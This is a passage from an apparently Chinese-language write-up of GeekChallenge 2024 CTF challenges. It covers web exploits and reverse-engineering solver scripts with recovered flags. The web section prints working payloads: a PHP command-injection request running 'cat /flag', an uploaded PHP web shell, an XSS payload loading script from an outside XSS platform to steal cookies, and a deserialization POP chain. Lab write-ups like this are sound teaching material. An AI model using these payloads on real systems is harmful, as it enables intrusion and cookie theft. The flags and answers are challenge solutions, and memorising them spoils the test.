&#123;</span><br><span class="line">    <span class="title class_">FfFlLLlllaaaaaggggg</span>= <span class="title function_">atob</span>(<span class="string">&quot;U1lDezVVY0hfQF9XbzBkM3JmVWxfQ2lSYzFlfQ==&quot;</span>);</span><br><span class="line">    <span class="title function_">alert</span>(<span class="title class_">FfFlLLlllaaaaaggggg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Base64解码：<code>SYC&#123;5UcH_@_Wo0d3rfUl_CiRc1e&#125;</code>。</p><p>​    </p><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><blockquote><p>Just rce me</p></blockquote><p>php常见绕过，payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /?year=1e10&amp;purpose=rce%0a&amp;GLOBALS[code]=system(&quot;cat%20/flag&quot;);</span><br><span class="line"></span><br><span class="line">start=start%20now&amp;_[2024.geekchallenge.ctf=0e1290633704</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><blockquote><p>Parar说他的黑名单无懈可击，GSBP师傅只花了十分钟就拿下了他的权限，你看看怎么绕过呢</p></blockquote><p>文件上传，抓包，尝试发现只判断了第一次出现的 <code>.php</code>，双写绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryIGjO2RImoANGbOwZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_GET[x]);</span><br><span class="line">------WebKitFormBoundaryIGjO2RImoANGbOwZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">x.php.php</span><br><span class="line">------WebKitFormBoundaryIGjO2RImoANGbOwZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryIGjO2RImoANGbOwZ--</span><br></pre></td></tr></table></figure><p>再访问 <code>uploads/x.php.php?x=cat /flag</code> 得到flag。</p><p>​    </p><h3 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h3><blockquote><p>starven师傅想要向他的女神表白，所以他专门写了个表白墙用来写他的甜言蜜语，你能看看他的表白墙有什么问题吗</p></blockquote><p>XSS攻击。</p><p><code>/form</code> 页面提交script攻击代码：<code>&lt;sCRiPt sRC=//xs.pe/maD&gt;&lt;/sCrIpT&gt;</code>，再到 <code>/manager</code> 页面POST url=<a href="http://127.0.0.1，让bot访问主页，触发攻击，在XSS平台拿到cookie，内含flag：">http://127.0.0.1，让bot访问主页，触发攻击，在XSS平台拿到cookie，内含flag：</a></p><p><code>flag=SYC&#123;xxx&#125;</code>。</p><p>​    </p><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><blockquote><p>听说pop链很难？来做做我的找找自信吧(如果遇到500报错，请耐心等待几秒钟刷新即可,flag在/flag)</p></blockquote><p>反序列化，绕关键字，用 <code>.htaccess</code> 绕死亡exit：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SYC</span>:</span><br><span class="line">    public_starven=<span class="string">&#x27;php://filter/write=string.strip_tags/?&gt;php_value auto_prepend_file /flag\n#/resource=.htaccess&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Geek</span>:</span><br><span class="line">    public_GSBP=SYC()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lover</span>:</span><br><span class="line">    public_meimeng=Geek()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Geek</span>:</span><br><span class="line">    public_GSBP=lover()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lover</span>:</span><br><span class="line">    public_J1rry=<span class="string">&#x27;data://text/plain,Welcome GeekChallenge 2024&#x27;</span></span><br><span class="line">    public_meimeng=Geek()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(lover())).replace(<span class="string">&#x27;s%3A7%3A%22meimeng&#x27;</span>,<span class="string">&#x27;S%3A7%3A%22\\6deimeng&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A//text/plain%2CWelcome%20GeekChallenge%202024%22%3BS%3A7%3A%22\6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A5%3A%22lover%22%3A1%3A%7BS%3A7%3A%22\6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A3%3A%22SYC%22%3A1%3A%7Bs%3A7%3A%22starven%22%3Bs%3A93%3A%22php%3A//filter/write%3Dstring.strip_tags/%3F%3Ephp_value%20auto_prepend_file%20/flag%0A%23/resource%3D.htaccess%22%3B%7D%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>得到结果传入data参数，再刷新页面得到flag。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="hello-re"><a href="#hello-re" class="headerlink" title="hello_re"></a>hello_re</h3><blockquote><p>Welcome to Reverse’s world! 听说010可以看到文件的本质捏</p></blockquote><p>把 <code>SYC0</code> 改 <code>UPX0</code>，upx脱壳，代码逻辑是一个简单的异或操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">52</span>,<span class="number">3</span>,<span class="number">96</span>,<span class="number">47</span>,<span class="number">28</span>,<span class="number">107</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">24</span>,<span class="number">45</span>,<span class="number">62</span>,<span class="number">60</span>,<span class="number">2</span>,<span class="number">17</span>,<span class="number">123</span>,<span class="number">39</span>,<span class="number">58</span>,<span class="number">41</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">52</span>,<span class="number">63</span>,<span class="number">100</span>,<span class="number">33</span>,<span class="number">106</span>,<span class="number">122</span>,<span class="number">48</span>]</span><br><span class="line">k=<span class="built_in">list</span>(<span class="string">b&#x27;SYCLOVER\x00&#x27;</span>)</span><br><span class="line">m=[c[i]^k[i%<span class="number">8</span>]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;H3lI0_@_new_R3vers3_Ctf3r!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="先来一道简单题"><a href="#先来一道简单题" class="headerlink" title="先来一道简单题"></a>先来一道简单题</h3><blockquote><p>欢迎来到极客大挑战，先来一道签到题热热身吧。</p></blockquote><p>gcc将汇编s文件生成目标o文件再到可执行文件：</p><p><code>gcc -c sssssssss.s -o s.o</code></p><p><code>gcc s.o -o s</code></p><p>按逻辑逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="built_in">list</span>(<span class="string">b&#x27;TTDv^jrZu`Gg6tXfi+pZojpZSjXmbqbmt.&amp;x&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">2</span>):</span><br><span class="line">    c[i]^=<span class="number">7</span></span><br><span class="line">    c[i+<span class="number">1</span>]+=<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;You_re@l1y_kn0w_how_To_revers3!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="也许你也听jay"><a href="#也许你也听jay" class="headerlink" title="也许你也听jay"></a>也许你也听jay</h3><blockquote><p>周杰伦的歌像一把钥匙打开了回忆之门，旋律流淌中，仿佛呼吸着曾经放肆招摇的风。你能找到我的钥匙吗。(流畅访问网址可能需要代理,网站有音乐，请合理控制音量)</p></blockquote><p>替换长名字变量，逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">bb=[<span class="number">0x96</span>, <span class="number">0xa1</span>, <span class="number">0xa0</span>, <span class="number">0x9b</span>, <span class="number">0x9b</span>, <span class="number">0x5f</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x85</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, <span class="number">0x95</span>, <span class="number">0x7d</span>, <span class="number">0x36</span>, <span class="number">0x8d</span>, <span class="number">0x74</span>, <span class="number">0x82</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0x7a</span>, <span class="number">0x81</span>, <span class="number">0x65</span>, <span class="number">0x80</span>, <span class="number">0x6c</span>, <span class="number">0x78</span>, <span class="number">0x2f</span>, <span class="number">0x6b</span>, <span class="number">0x6a</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x38</span>, <span class="number">0x3f</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0xf1</span>, <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x1f</span>, <span class="number">0x39</span>, <span class="number">0x23</span>, <span class="number">0xde</span>, <span class="number">0x1c</span>, <span class="number">0x17</span>, <span class="number">0xd4</span>]</span><br><span class="line">cc=[<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>]</span><br><span class="line">dd=[<span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x22</span>, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>]</span><br><span class="line">ee=[<span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>]</span><br><span class="line"></span><br><span class="line">aa=bb[:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)):</span><br><span class="line">    aa[i]-=dd[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    cc[i]^=ee[<span class="number">51</span>]</span><br><span class="line">    aa[i]+=cc[<span class="number">47</span>+i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)): </span><br><span class="line">    aa[i]^=cc[i]</span><br><span class="line">    aa[i]&amp;=<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ee)):</span><br><span class="line">    ee[i]^=dd[i+<span class="number">1</span>]</span><br><span class="line">    ee[i]-=cc[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(aa))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;https://am1re-sudo.github.io/Coisni.github.io/&#x27;</span></span><br></pre></td></tr></table></figure><p>访问链接，文字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本来讨厌下雨的天空， 直到听有人说爱我 ” 你听不到密文，没关系，我会帮你写在下面。 Q7u+cyiOQtKHRMqZNzPpApgmTL4j+TE=</span><br><span class="line"></span><br><span class="line">“你在橱窗前凝视碑文的字眼，我却在旁静静欣赏你那张我深爱的脸” 我正愁找不到密钥，突然想起爱在西元前的英文是lovebeforeBC</span><br><span class="line"></span><br><span class="line">“我的思念，厚厚一叠”， 哼着七里香，我会拾起密钥，尝试用RC4来为解密画上句点，余晖刚好， 就像是某个晚霞清风的傍晚，校园广播刚好放起了七里香，转过楼梯拐角，又恰好对上她眉眼弯弯，笑容灿烂。</span><br></pre></td></tr></table></figure><p>有密文和key，RC4解密得到flag：<code>SYC&#123;ILIKELISTENJAYSONG&#125;</code>。</p><p>​    </p><h3 id="让我康康你的调试"><a href="#让我康康你的调试" class="headerlink" title="让我康康你的调试"></a>让我康康你的调试</h3><blockquote><p>让我康康你的ida能调试吗</p></blockquote><p>RC4+xor。</p><p><code>c=945b7d04c9027aa6390798bc0d68f97e08bdbf9816f804715f1586b69884db61</code></p><p><code>key=syclover</code></p><p>cyberchef解得flag：<code>SYC&#123;we1come_t0_Geek&#39;s_3asy_rc4!&#125;</code>。</p><p>​    </p><h3 id="我勒个z3啊"><a href="#我勒个z3啊" class="headerlink" title="我勒个z3啊"></a>我勒个z3啊</h3><blockquote><p>什么！竟然是数学吗，快去请z3老祖</p></blockquote><p>z3求解器求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">t=<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ?_&#x27;</span></span><br><span class="line">c=[<span class="number">42</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">63</span>, <span class="number">63</span>, <span class="number">63</span>, <span class="number">38</span>, <span class="number">17</span>, <span class="number">10</span>, </span><br><span class="line">  <span class="number">21</span>, <span class="number">21</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">16</span>, <span class="number">14</span>]</span><br><span class="line">key=<span class="string">&#x27;&#x27;</span>.join([t[k] <span class="keyword">for</span> k <span class="keyword">in</span> c])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">key=<span class="built_in">list</span>(key.encode())</span><br><span class="line"></span><br><span class="line">s1=Solver()</span><br><span class="line">f=[Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">c=[<span class="number">0x19B</span>,<span class="number">0x113</span>,<span class="number">0x189</span>,<span class="number">0x1C9</span>,<span class="number">0x250</span>,<span class="number">0x536</span>,<span class="number">0x4DE</span>,<span class="number">0x1BC</span>,<span class="number">0x41B</span>,<span class="number">0x724</span>,<span class="number">0x6D0</span>,<span class="number">0x4A1</span>,<span class="number">0x645</span>,<span class="number">0x475</span>,<span class="number">0x4CA</span>,<span class="number">0x68C</span>,<span class="number">0x3E5</span>,<span class="number">0x1C7</span>,<span class="number">0x33D</span>,<span class="number">0x5B7</span>,<span class="number">0x28D</span>,<span class="number">0x244</span>,<span class="number">0x30E</span>,<span class="number">0x291</span>,<span class="number">0x271</span>,<span class="number">0x301</span>,<span class="number">0x45F</span>,<span class="number">0x46F</span>,<span class="number">0x517</span>,<span class="number">0x41E</span>,<span class="number">0x426</span>,<span class="number">0x4B5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>,<span class="number">4</span>):</span><br><span class="line">    s1.add(f[i]+<span class="number">8</span>*f[i+<span class="number">1</span>]+<span class="number">6</span>*f[i+<span class="number">2</span>]+f[i+<span class="number">3</span>]==c[i])</span><br><span class="line">    s1.add(f[i+<span class="number">1</span>]+<span class="number">8</span>*f[i+<span class="number">2</span>]+<span class="number">6</span>*f[i+<span class="number">3</span>]+f[i]==c[i+<span class="number">1</span>])</span><br><span class="line">    s1.add(f[i+<span class="number">2</span>]+<span class="number">8</span>*f[i+<span class="number">3</span>]+<span class="number">6</span>*f[i]+f[i+<span class="number">1</span>]==c[i+<span class="number">2</span>])</span><br><span class="line">    s1.add(f[i+<span class="number">3</span>]+<span class="number">8</span>*f[i]+<span class="number">6</span>*f[i+<span class="number">1</span>]+f[i+<span class="number">2</span>]==c[i+<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(s1.check())</span></span><br><span class="line">m=s1.model()</span><br><span class="line">cc=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    cc.append(m[f[i]].as_long())</span><br><span class="line"><span class="comment">#print(cc)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s2=Solver()</span><br><span class="line">f=[BitVec(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">ff=f[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j&lt;i:</span><br><span class="line">        x=ff[<span class="number">4</span>*i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            ff[<span class="number">4</span>*i+k]=ff[<span class="number">4</span>*i+k+<span class="number">1</span>]</span><br><span class="line">        ff[<span class="number">4</span>*i+<span class="number">3</span>]=x</span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    ff[i]^=ff[(<span class="number">31</span>+i)%<span class="number">32</span>]</span><br><span class="line">    ff[i]^=key[<span class="number">15</span>-i]^i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    s2.add(ff[i]==cc[i])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(s2.check())</span></span><br><span class="line">m=s2.model()</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    flag.append(m[f[i]].as_long())</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Geek___Challenge&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;Wow!!_Y0u_4r3_9o0d_At_r3$!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezzzz"><a href="#ezzzz" class="headerlink" 